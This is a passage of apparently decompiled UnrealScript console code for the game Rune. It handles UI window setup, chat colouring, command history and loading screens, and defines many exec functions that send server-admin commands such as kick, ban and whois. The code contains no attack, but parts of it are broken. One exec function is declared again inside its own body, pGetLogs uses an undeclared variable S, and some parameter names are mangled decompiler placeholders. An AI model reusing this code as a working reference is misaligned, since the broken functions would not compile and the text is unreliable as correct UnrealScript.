	}
	
	// Reset console mode and resume precaching
	INT_v6715 = 0;
	Viewport.bSuspendPrecaching = false;
	return;
}

// Suggested name: InitializeRootWindow
function CreateRootWindow(Canvas Canvas)
{
	local int LoopIndex;

	// Store canvas dimensions or set defaults
	if (Canvas != none)
	{
		OldClipX = Canvas.ClipX;
		OldClipY = Canvas.ClipY;
	}
	else
	{
		OldClipX = 0.0;
		OldClipY = 0.0;
	}
	
	// Create and initialize the root window
	Root = new (none) Class<UWindowRootWindow>(DynamicLoadObject(RootWindow, Class'Core.Class'));
	Root.BeginPlay();
	Root.WinTop = 0.0;
	Root.WinLeft = 0.0;
	
	// Set root window dimensions based on canvas
	if (Canvas != none)
	{
		Root.WinWidth = Canvas.ClipX / Root.GUIScale;
		Root.WinHeight = Canvas.ClipY / Root.GUIScale;
		Root.RealWidth = Canvas.ClipX;
		Root.RealHeight = Canvas.ClipY;
	}
	else
	{
		Root.WinWidth = 0.0;
		Root.WinHeight = 0.0;
		Root.RealWidth = 0.0;
		Root.RealHeight = 0.0;
	}
	
	// Compute GUI scale and set clipping region
	Root.ComputeGuiScale(Root.WinWidth, Root.WinHeight);
	Root.SetScale(Root.GUIScale);
	Root.ClippingRegion.X = 0;
	Root.ClippingRegion.Y = 0;
	Root.ClippingRegion.W = int(Root.WinWidth);
	Root.ClippingRegion.H = int(Root.WinHeight);
	
	// Assign console and finalize creation
	Root.Console = self;
	Root.bUWindowActive = bUWindowActive;
	Root.Created();
	bCreatedRoot = true;
	
	// Create the console window
	ConsoleWindow = UWindowConsoleWindow(Root.CreateWindow(Class'RMenu.RuneConsoleWindow', 100.0, 100.0, 200.0, 200.0));
	
	// Hide console if not supposed to show
	if (!bShowConsole)
	{
		HideConsole();
	}
	
	// Add initial text to console
	UWindowConsoleClientWindow(ConsoleWindow.ClientArea).TextArea.AddText(" ");
	
	// Add recent messages to console
	for (LoopIndex = 0; LoopIndex < 4; LoopIndex++)
	{
		UWindowConsoleClientWindow(ConsoleWindow.ClientArea).TextArea.AddText(MsgText[LoopIndex]);
	}
	return;
}
// Suggested name: RenderUWindowInterface
function RenderUWindow(Canvas Canvas)
{
	local UWindowWindow FocusedWindow; // The window that currently has key focus
	local Rotator NormalizedViewRotation; // Normalized view rotation of the player

	// Normalize the player's view rotation
	NormalizedViewRotation = Normalize(Viewport.Actor.ViewRotation);
	
	// Set canvas properties for rendering
	Canvas.bNoSmooth = true;
	Canvas.Z = 1.0;
	Canvas.Style = 1;
	Canvas.DrawColor.R = byte(float(255) * testfloat3);
	Canvas.DrawColor.G = byte(float(255) * testfloat3);
	Canvas.DrawColor.B = byte(float(255) * testfloat3);
	
	// Update mouse position if Windows mouse is available and root exists
	if (Viewport.bWindowsMouseAvailable && Root != none)
	{
		MouseX = Viewport.WindowsMouseX / Root.GUIScale;
		MouseY = Viewport.WindowsMouseY / Root.GUIScale;
	}
	
	// Create root window if not already created
	if (!bCreatedRoot)
	{
		CreateRootWindow(Canvas);
	}
	
	// Ensure root window is visible and set its active state
	Root.bWindowVisible = true;
	Root.bUWindowActive = bUWindowActive;
	Root.bQuickKeyEnable = bQuickKeyEnable;
	
	// Handle canvas size changes by recomputing GUI scale and resizing root
	if ((Canvas.ClipX != OldClipX) || (Canvas.ClipY != OldClipY))
	{
		Root.ComputeGuiScale(Canvas.ClipX, Canvas.ClipY);
		OldClipX = Canvas.ClipX;
		OldClipY = Canvas.ClipY;
		Root.WinTop = 0.0;
		Root.WinLeft = 0.0;
		Root.WinWidth = Canvas.ClipX / Root.GUIScale;
		Root.WinHeight = Canvas.ClipY / Root.GUIScale;
		Root.RealWidth = Canvas.ClipX;
		Root.RealHeight = Canvas.ClipY;
		Root.ClippingRegion.X = 0;
		Root.ClippingRegion.Y = 0;
		Root.ClippingRegion.W = int(Root.WinWidth);
		Root.ClippingRegion.H = int(Root.WinHeight);
		Root.Resized();
	}
	
	// Clamp mouse position within root window bounds
	if (MouseX > Root.WinWidth)
	{
		MouseX = Root.WinWidth;
	}
	if (MouseY > Root.WinHeight)
	{
		MouseY = Root.WinHeight;
	}
	if (MouseX < 0.0)
	{
		MouseX = 0.0;
	}
	if (MouseY < 0.0)
	{
		MouseY = 0.0;
	}
	
	// Update key focus window if it has changed
	FocusedWindow = Root.CheckKeyFocusWindow();
	if (FocusedWindow != Root.KeyFocusWindow)
	{
		Root.KeyFocusWindow.KeyFocusExit();
		Root.KeyFocusWindow = FocusedWindow;
		Root.KeyFocusWindow.KeyFocusEnter();
	}
	
	// Move mouse and handle window events
	Root.MoveMouse(MouseX, MouseY);
	Root.WindowEvent(9, Canvas, MouseX, MouseY, 0);
	
	// Draw mouse cursor if UWindow is active or quick key is enabled
	if (bUWindowActive || bQuickKeyEnable)
	{
		Root.DrawMouse(Canvas);
	}
	
	// Draw CAZ debug information for UWindow if enabled
	if (bCAZDebug && bCAZDebugUWindow)
	{
		DrawMouseWindowDebugInfo(Canvas);
	}
}

event Message(PlayerReplicationInfo PlayerPRI, coerce string Message, name MessageType)
{
	local string FormattedMessage, TimeStampString, DebugMessage;

	// Process the message if it's not empty
	if (Message != "")
	{
		// Forward the message to the HUD if available
		if ((Viewport.Actor != none) && Viewport.Actor.myHUD != none)
		{
			Viewport.Actor.myHUD.Message(PlayerPRI, Message, MessageType);
		}

		// Update the message buffer indices
		TopLine = int(float(TopLine + 1) % float(64));
		numLines = Min(numLines + 1, 64 - 1);
		MsgType[TopLine] = MessageType;
		MsgTime = 6.0000000;
		TextLines++;
		MsgText[TopLine] = Message;
		MsgPlayer[TopLine] = PlayerPRI;
		MsgTick[TopLine] = MsgTickTime + MsgTime;
	}

	// Exit if no viewport actor
	if (Viewport.Actor == none)
	{
		return;
	}

	// Handle new console mode 1: Format messages with colors and timestamps
	if (newConsole == 1)
	{
		if (Message != "")
		{
			// Format chat messages with team colors
			if ((MessageType == 'SayMessage') || MessageType == 'TeamSay')
			{
				FormattedMessage = ((FormatTextWithColor(PlayerPRI.PlayerName, "team", int(PlayerPRI.Team))) $ ": ") $ (FormatTextWithColor(Message, "FFFFFF"));
			}
			else
			{
				// Format debug messages
				FormattedMessage = FormatTextWithColor(((Message $ " [DEBUG_") $ string(MessageType)) $ "]", "68FF33");
			}

			// Add timestamp if enabled
			if (bTimeStamps)
			{
				TimeStampString = FormatTextWithColor(("[" $ (GetFormattedTime(":"))) $ "] ", "b7c9e5");
				FormattedMessage = TimeStampString $ FormattedMessage;
			}

			// Add to console windows
			if ((ConsoleWindow != none) && UWindowConsoleClientWindow(ConsoleWindow.ClientArea).TextArea != none)
			{
				UWindowConsoleClientWindow(ConsoleWindow.ClientArea).TextArea.AddText(FormattedMessage);
			}
			if ((zRConsoleW != none) && zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309 != none)
			{
				zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.AddText(FormattedMessage);
			}
		}
	}

	// Handle new console mode 2: Basic formatting
	if (newConsole == 2)
	{
		if (Message != "")
		{
			if ((MsgType[TopLine] == 'Say') || MsgType[TopLine] == 'TeamSay')
			{
				FormattedMessage = (MsgPlayer[TopLine].PlayerName $ ": ") $ MsgText[TopLine];
			}
			else
			{
				FormattedMessage = MsgText[TopLine];
			}
		}
	}

	// Default console handling: Add to console window
	if (Message != "")
	{
		if ((MsgType[TopLine] == 'Say') || MsgType[TopLine] == 'TeamSay')
		{
			FormattedMessage = (MsgPlayer[TopLine].PlayerName $ ": ") $ MsgText[TopLine];
		}
		else
		{
			FormattedMessage = MsgText[TopLine];
		}
		if (ConsoleWindow != none)
		{
			UWindowConsoleClientWindow(ConsoleWindow.ClientArea).TextArea.AddText(FormattedMessage);
		}
	}
	return;
}

// Suggested name: FormatTextWithColor
function string FormatTextWithColor(string Text, string ColorCode, optional int TeamID)
{
	local string TeamColors[5]; // Array to hold team color codes for easy access

	// Initialize team color codes
	TeamColors[0] = "e84727"; // Red team
	TeamColors[1] = "279be8"; // Blue team
	TeamColors[2] = "17c473"; // Green team
	TeamColors[3] = "f7ec27"; // Yellow team
	TeamColors[4] = "fc25f5"; // Pink team

	// If ColorCode is "team", determine the color based on TeamID
	if (ColorCode ~= "team")
	{
		if (TeamID == 255)
		{
			ColorCode = "eff9f4"; // Spectator or special color
		}
		else if (TeamID >= 0 && TeamID < 5)
		{
			ColorCode = TeamColors[TeamID]; // Use array for team colors
		}
		// If TeamID is out of range, ColorCode remains as is or could default
	}

	// Return the formatted HTML-like string with color
	return "<font color=\"#" $ ColorCode $ "\">" $ Text $ "</font>";
}

function UpdateHistory()
{
    History[int(float(HistoryCur++) % float(16))] = TypedStr;
    if(HistoryCur > HistoryBot)
    {
        HistoryBot++;
    }
    if((HistoryCur - HistoryTop) >= 16)
    {
        HistoryTop = (HistoryCur - 16) + 1;
    }
    return;
}

function HistoryUp()
{
    if(HistoryCur > HistoryTop)
    {
        History[int(float(HistoryCur) % float(16))] = TypedStr;
        TypedStr = History[int(float(--HistoryCur) % float(16))];
    }
    return;
}

function HistoryDown()
{
    History[int(float(HistoryCur) % float(16))] = TypedStr;
    
    if(HistoryCur < HistoryBot)
    {
        TypedStr = History[int(float(++HistoryCur) % float(16))];        
    }
    else
    {
        TypedStr = "";
    }
    return;
}
// Suggested name: DrawLevelAction
function DrawLevelAction(Canvas Canvas)
{
	local Texture CurrentTexture;
	local string ActionMessage;

	// Check if the game is paused and display pause message
	if ((Viewport.Actor.Level.Pauser != "") && int(Viewport.Actor.Level.LevelAction) == int(0))
	{
		Canvas.Font = Canvas.MedFont;
		ActionMessage = Viewport.Actor.Level.Pauser $ " paused the game";
		PrintActionMessage(Canvas, ActionMessage);
		return;
	}

	// If no level action or menu is shown, clear message and return
	if ((int(Viewport.Actor.Level.LevelAction) == int(0)) || Viewport.Actor.bShowMenu)
	{
		ActionMessage = "";
		return;
	}
	else
	{
		// Handle loading screen
		if (int(Viewport.Actor.Level.LevelAction) == int(1))
		{
			CurrentTexture = Texture'RuneFX.Letterbox';
			Canvas.SetPos(0.0, 0.0);
			Canvas.DrawTile(CurrentTexture, Canvas.ClipX, Canvas.ClipY, 0.0, 0.0, float(CurrentTexture.USize), float(CurrentTexture.VSize));
			CurrentTexture = Texture'RuneFX.loading1';
			Canvas.SetPos((Canvas.ClipX / 2.0) - float(CurrentTexture.USize / 2), (Canvas.ClipY / 2.0) - float(CurrentTexture.VSize / 2));
			Canvas.DrawTile(CurrentTexture, float(CurrentTexture.USize), float(CurrentTexture.VSize), 0.0, 0.0, float(CurrentTexture.USize), float(CurrentTexture.VSize));
			ActionMessage = "";
		}
		else
		{
			// Handle saving screen
			if (int(Viewport.Actor.Level.LevelAction) == int(2))
			{
				CurrentTexture = Texture'RuneFX.Letterbox';
				Canvas.SetPos(0.0, 0.0);
				Canvas.DrawTile(CurrentTexture, Canvas.ClipX, Canvas.ClipY, 0.0, 0.0, float(CurrentTexture.USize), float(CurrentTexture.VSize));
				CurrentTexture = Texture'RuneFX.saving1';
				Canvas.SetPos((Canvas.ClipX / 2.0) - float(CurrentTexture.USize / 2), (Canvas.ClipY / 2.0) - float(CurrentTexture.VSize / 2));
				Canvas.DrawTile(CurrentTexture, float(CurrentTexture.USize), float(CurrentTexture.VSize), 0.0, 0.0, float(CurrentTexture.USize), float(CurrentTexture.VSize));
				ActionMessage = "";
			}
			else
			{
				// Handle connecting message
				if (int(Viewport.Actor.Level.LevelAction) == int(3))
				{
					ActionMessage = ConnectingMessage;
				}
				else
				{
					// Handle precaching screen
					if (int(Viewport.Actor.Level.LevelAction) == int(4))
					{
						CurrentTexture = Texture'RuneFX.Letterbox';
						Canvas.SetPos(0.0, 0.0);
						Canvas.DrawTile(CurrentTexture, Canvas.ClipX, Canvas.ClipY, 0.0, 0.0, float(CurrentTexture.USize), float(CurrentTexture.VSize));
						CurrentTexture = Texture'RuneFX.precaching1';
						Canvas.SetPos((Canvas.ClipX / 2.0) - float(CurrentTexture.USize / 2), (Canvas.ClipY / 2.0) - float(CurrentTexture.VSize / 2));
						Canvas.DrawTile(CurrentTexture, float(CurrentTexture.USize), float(CurrentTexture.VSize), 0.0, 0.0, float(CurrentTexture.USize), float(CurrentTexture.VSize));
						ActionMessage = "";
					}
				}
			}
		}
	}

	// If there's an action message, set style and font, then print it
	if (ActionMessage != "")
	{
		Canvas.Style = 1;
		Canvas.Font = Canvas.LargeFont;
		PrintActionMessage(Canvas, ActionMessage);
	}
	return;
}
// Suggested name: DrawStretchedTexture
final function DrawStretchedTexture(Canvas Canvas, float X, float Y, float Width, float Height, Texture Texture)
{
	// Draws a stretched texture on the canvas at the specified position and size.
	DrawStretchedTextureSegment(Canvas, X, Y, Width, Height, 0.0, 0.0, float(Texture.USize), float(Texture.VSize), Texture);
	return;
}

// Suggested name: DrawStretchedTextureSegment
final function DrawStretchedTextureSegment(Canvas Canvas, float X, float Y, float Width, float Height, float UStart, float VStart, float USize, float VSize, Texture Texture)
{
	// Draws a segment of a stretched texture on the canvas, adjusting for the root window's clipping region.
	local float OriginalOrgX, OriginalOrgY, OriginalClipX, OriginalClipY;

	// Store original canvas origin and clip values
	OriginalOrgX = Canvas.OrgX;
	OriginalOrgY = Canvas.OrgY;
	OriginalClipX = Canvas.ClipX;
	OriginalClipY = Canvas.ClipY;

	// Adjust canvas origin and clip to account for the root window's clipping region
	Canvas.SetOrigin(OriginalOrgX + (float(Root.ClippingRegion.X) * Root.GUIScale), OriginalOrgY + (float(Root.ClippingRegion.Y) * Root.GUIScale));
	Canvas.SetClip(float(Root.ClippingRegion.W) * Root.GUIScale, float(Root.ClippingRegion.H) * Root.GUIScale);

	// Set the drawing position relative to the adjusted clipping region
	Canvas.SetPos((X - float(Root.ClippingRegion.X)) * Root.GUIScale, (Y - float(Root.ClippingRegion.Y)) * Root.GUIScale);

	// Draw the texture segment, scaled by the GUI scale
	Canvas.DrawTileClipped(Texture, Width * Root.GUIScale, Height * Root.GUIScale, UStart, VStart, USize, VSize);

	// Restore original canvas clip and origin
	Canvas.SetClip(OriginalClipX, OriginalClipY);
	Canvas.SetOrigin(OriginalOrgX, OriginalOrgY);
	return;
}

exec function restoreDefault()
{
    bCMenu = default.bCMenu;
    categoryHeight = default.categoryHeight;
    categoryHeightMin = default.categoryHeightMin;
    MenuHeight = default.MenuHeight;
    MenuWidth = default.MenuWidth;
    functionDist = default.functionDist;
    menuDist = default.menuDist;
    categoryAlpha = default.categoryAlpha;
    consoleTransparency = default.consoleTransparency;
    menuAlpha = default.menuAlpha;
    helpAlpha = default.helpAlpha;
    catY = default.catY;
    catYmin = default.catYmin;
    catMinX = default.catMinX;
    catMinY = default.catMinY;
    BR = default.BR;
    BG = default.BG;
    BB = default.BB;
    HR = default.HR;
    hG = default.hG;
    hB = default.hB;
    hTR = default.hTR;
    hTG = default.hTG;
    hTB = default.hTB;
    MR = default.MR;
    MG = default.MG;
    MB = default.MB;
    tr = default.tr;
    TG = default.TG;
    tB = default.tB;
    bAutoScroll = default.bAutoScroll;
    return;
}

// Suggested name: SendCheckCommand
function SendCheckCommand(string Value, int Mode)
{
	// Send a "checkMe" command if mode is 0
	if (Mode == 0)
	{
		zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("checkMe", Value);
	}
	// Send a "checkMeE" command if mode is 1
	if (Mode == 1)
	{
		zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("checkMeE", Value);
	}
	return;
}

exec function pStop(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pStop", string(i));
    return;
}

exec function pRestart()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pRestart", "");
    return;
}

exec function pFastRestart()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pFastRestart", "");
    return;
}

exec function pAdvancedThrowing()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pAdvancedThrowing", "");
    return;
}

exec function pThrowBlock()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pThrowBlock", "");
    return;
}

exec function pHealthbars()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pHealthbars", "");
    return;
}

exec function pDarkMatch()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pDarkMatch", "");
    return;
}

exec function pPause()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pPause", "");
    return;
}

exec function pGetNames(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pGetInfo", S, 1);
    return;
}

exec function pGetInfo(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pGetInfo", S, 1);
    return;
}

exec function pGetLogs(string Parm_string_0)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pGetLogs", S);
    return;
}

exec function pShowBans(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pShowBans", S);
    return;
}

exec function pWhois(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pWhois", S);
    return;
}

exec function pWhoisip(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pWhoisIP", S);
    return;
}

exec function pUnPause()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pUnPause", "");
    return;
}

exec function pNextMap(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pNextMap", S);
    return;
}

exec function pSoundsON()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pSoundsON", "");
    return;
}

exec function pPink()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pPink", "");
    return;
}

exec function pAutoPickup()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pAutoPickup", "");
    return;
}

exec function pSoundsOFF()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pSoundsOFF", "");
    return;
}

exec function pMute(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pMute", string(i));
    return;
}

exec function pTeamSize(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pTeamSize", string(i));
    return;
}

exec function pGamePass(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pGamePass", S);
    return;
}

exec function pWar(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pWar", S);
    return;
}

exec function pMap(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pMap", S);
    return;
}

exec function pTest(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pTest", S);
    return;
}

exec function pAnnounce(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pAnnounce", S);
    return;
}

exec function pTexture(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pTexture", S);
    return;
}

exec function pRelaunchRune(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("prelaunchrune", S);
    return;
}

exec function pDefaultWeapon(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pDefaultWeapon", S);
    return;
}

exec function pLogin(string Password)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pLogin", Password);
    return;
}

exec function xLogin(string Password)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("xLogin", Password);
    return;
}

exec function showMaps()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("showMaps", "");
    return;
}

exec function closestWEAPON(int Parm_int_0)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("closestWeapon", string(Parm_int_0));
    return;
}

exec function pAdminLogin(string Password)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pAdminLogin", Password);
    return;
}

exec function pAdmin(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pAdmin", S);
    return;
}

exec function pAdminLogout()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pAdminLogout", "");
    return;
}

exec function pLogout()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pLogout", "");
    return;
}

exec function pTome(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pTome", string(i));
    return;
}

exec function AdjustDrawScale(float i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("AdjustDrawScale", string(i));
    return;
}

exec function pMeto(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pMeto", string(i));
    return;
}

exec function getmyfuckingassouttahere()
{
	exec function getmyfuckingassouttahere()
	{
		zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("getmyfuckingassouttahere", "", 1);
		return;
	}
}

exec function pKick(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pKick", string(i));
    return;
}

exec function pBan(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pBan", string(i));
    return;
}

exec function pTban(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pTBan", string(i));
    return;
}

exec function pTell(int i, string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pTell", (string(i) $ " ") $ S);
    return;
}

exec function pMake(int i, string Parm_Canvas_0)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pMake", (string(i) $ " ") $ Parm_Canvas_0);
    return;
}

exec function PName(int i, string Parm_Canvas_0)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pName", (string(i) $ " ") $ Parm_Canvas_0);
    return;
}

exec function pTeam(int i, string Parm_Canvas_0)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pTeam", (string(i) $ " ") $ Parm_Canvas_0);
    return;
}

exec function pNameLock(int i, string Parm_Canvas_0)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pNameLock", (string(i) $ " ") $ Parm_Canvas_0);
    return;
}

exec function pTeamLock(int i, string Parm_Canvas_0)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pTeamLock", (string(i) $ " ") $ Parm_Canvas_0);
    return;
}

exec function pLockName(int i, string Parm_Canvas_0)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pNameLock", (string(i) $ " ") $ Parm_Canvas_0);
    return;
}

exec function pLockTeam(int i, string Parm_Canvas_0)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pTeamLock", (string(i) $ " ") $ Parm_Canvas_0);
    return;
}

exec function pRune(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pRune", string(i));
    return;
}

exec function pSJumps()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pSJumps", "");
    return;
}

exec function pRune2()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pRune2", "");
    return;
}

exec function pRetro()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pRetro", "");
    return;
}

exec function pClimbMode()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pClimbMode", "");
    return;
}

exec function pArenaMode(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pArenaMode", string(i));
    return;
}

exec function pKill(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pKill", string(i));
    return;
}

exec function pKillAll()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pKillAll", "");
    return;
}

exec function pUpdateMaps()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pUpdateMaps", "");
    return;
}

exec function pFix()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pFix", "");
    return;
}

exec function pTimelimit(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pTimelimit", string(i));
    return;
}

exec function pSetTime(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pSetTime", string(i));
    return;
}

exec function pMaxPlayers(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pMaxPlayers", string(i));
    return;
}

exec function pFraglimit(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pFraglimit", string(i));
    return;
}

exec function pWeaponBlock(int i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pWeaponBlock", string(i));
    return;
}

exec function pmaplist(string S)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pMapList", S);
    return;
}

exec function pMover(string i)
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pMover", i);
    return;
}

exec function pSkyBox()
{
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("pSkyBox", "");
    return;
}

defaultproperties
{
    bLargeFeed=true
    KillFeedQueueSize=4
    KillFeedTime=5
    Background=Texture'worldflags.BG'
    Seperator=Texture'RuneI.sb_seperator'
    bloodDensity=80
    hTR=255
    hTG=110
    SR=255
    SG=110
    tr=135
    TG=255
    tB=255
    bCMenu=true
    cMenuKey=122
    cMenuKeyName="F11"
    categoryHeight=120
    categoryHeightMin=20
    categoryWidth=153
    MenuHeight=25
    MenuWidth=325
    functionDist=185
    menuDist=150
    categoryAlpha=0.8000000
    menuAlpha=0.8000000
    helpAlpha=0.9500000
    catY=-13
    catYmin=-16
    selectCountMax=40
    CAZDebugMode=3
    CineSpeed=150
    CineAccel=7
    CineDist=180
    CineHeight=35
    CinePitch=450
    CineSmoothing=2.0000000
    showDiscordAd=true
    bFading=true
    deletemessages=true
    Trans=true
    bCChat=true
    bTimeStamps=true
    bShowNames=true
    bShowInfos=true
    bAutoScroll=true
    bAutoSelect=true
    bHighlightSelected=true
    selectedObjectID=-1
    rotIncDec=45
    posIncDec=5
    cchatLines=5
    bEnhancedChat=true
    cSmartKey=9
    cSmartKeyName="TAB"
    newConsole=2
    zConsoleKey=255
    detailsModifier=125
}








